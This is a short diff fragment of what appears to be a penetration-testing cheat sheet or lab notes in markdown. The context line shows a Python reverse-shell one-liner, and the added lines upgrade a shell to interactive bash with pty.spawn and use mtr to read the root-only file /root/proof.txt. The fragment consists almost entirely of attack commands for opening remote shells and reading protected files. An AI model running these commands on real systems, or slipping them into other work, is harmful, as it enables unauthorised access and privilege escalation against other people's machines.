@@ -11,11 +11,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 
 ```
-
+python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 ```
-
+mtr --raw -F /root/proof.txt
 ```
 
 ```
